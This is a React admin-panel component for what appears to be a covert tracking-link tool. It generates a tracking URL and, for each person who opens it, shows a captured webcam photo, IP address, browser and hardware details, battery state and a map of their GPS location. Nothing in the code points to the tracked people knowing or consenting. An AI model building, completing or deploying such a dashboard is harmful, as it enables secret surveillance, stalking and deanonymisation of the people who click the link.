import React, { useEffect, useState } from "react";
import "./App.css";

export default function AdminPanel() {

  const [logs, setLogs] = useState([]);
  const [url, setUrl] = useState("");
  const [selectedUser, setSelectedUser] = useState(false);
  const [images, setImages] = useState([]);
  const [stats, setStats] = useState([]);
  const [domain, setDomain] = useState("localhost:3001");

  const fetchLogs = async () => {
    try {
      const res = await fetch("http://localhost:5000/api/auth/logs");
      const data = await res.json();
      setLogs(data.logs || []);
    } catch (err) {
      console.error(err);
    }
  };


  const fetchUrl = async () => {
    try {
      const res = await fetch("http://localhost:5000/api/auth/auto-generate");
       const data =await res.json();
      setUrl(data.trackingUrl);
    } catch (error) {
      console.log(error);
    }
  };

  const fetchImages = async () => {
    try {
      const res = await fetch("http://localhost:5000/api/auth/images");
      const data = await res.json();
      setImages(data.images || []);
    } catch (err) {
      console.error(err);
    }
  };
// const fetchtotal =async (req,res) => {
//   try {
//     const res = await fetch("http://localhost:5000/api/auth/stats");
//     const data = await res.json();
//     setStats( data.stats)
//   } catch (error) {
//      console.error(error)
//   }
// }
  useEffect(() => {

    fetchLogs();
    fetchUrl( );
    fetchImages(); 

  
  }, []);

  return (
    <div className="admin-container">
{
  stats&& <h2>{stats.pageview}</h2>
}
      
      {/* TRACKING URL TABLE */}

      <div className="table-container">

        <table className="  ">

          <thead>
            <tr>
              <th className=" ">Tracking URL</th>
              <th className=" ">ip</th>
              <th className=" ">last page </th>
              <th className="">Action</th>
            </tr>
          </thead>

          <tbody>
            <tr>
              <td className="col-md-4">
                {url ? url : "Generating..."}
              </td>

              <td className="col-md-7">
                {logs.length > 0 ? logs[0].ip : "ip genaratr...."}
              </td>
              <td className="col-lg-7">
                {logs.length > 0 ? logs[0].page : "loding..."}
              </td>

              <td className="col-md-7">
                <button
                  className="btn-view"
                  onClick={() => setSelectedUser(logs[0])}
                >
                  View
                </button>
              </td>
            </tr>
          </tbody>

        </table>

      </div>

      {/* USER DETAILS */}

      {selectedUser && (

        <div className="user-details">

          <div style={{ textAlign: "right" }}>
            <button
              className="btn-close"
              onClick={() => setSelectedUser(false)}
            >
              ✕ Close
            </button>
          </div>


          {logs.map((log, index) => {

            const userImage = images.find(
              (img) =>
                img.uniqueId === log.uniqueId
            );

            return (

              <div key={index} className="device-box">

              

                <h2 className="text-align-left py-5 devices">Camera</h2>

                {userImage ? (
                  <img
                    src={userImage.image || userImage.url}
                    alt="User"
                    width="250"
                    style={{ borderRadius: "10px" }}
                  />
                ) : (
                  <p>Loding...</p>
                )}
 

                
                <h2 className="text-align-left py-5 devices">Device Information</h2>

                <p><b>IP Address:</b> {log.ip}</p>
                <p><b>Browser:</b> {log.browser}</p>
                <p><b>Platform:</b> {log.platform}</p>
                <p><b>Screen:</b> {log.screen}</p>
                <p><b>RAM:</b> {log.ram}</p>
                <p><b>CPU Cores:</b> {log.cpuCores}</p>
                <p><b>Battery Level:</b> {log.batteryLevel}</p>
                <p><b>Charging:</b> {log.isCharging ? "Yes" : "No"}</p>
                <p><b>Page:</b> {log.page}</p>
                <p><b>Time:</b> {new Date(log.timestamp).toLocaleString()}</p>
 
               

                <h2 className="text-align-left py-5 devices">Location</h2>

                {log.latitude && log.longitude ? (

                  <iframe
                    title={"location-" + index}
                    width="100%"
                    height="300"
                    style={{ border: 0, borderRadius: "10px" }}
                    loading="lazy"
                    src={`https://maps.google.com/maps?q=${log.latitude},${log.longitude}&z=15&output=embed`}
                  ></iframe>

                ) : (

                  <p>No Location Data</p>

                )}

                <hr />

              </div>

            );

          })}

        </div>

      )}

    </div>
  );
}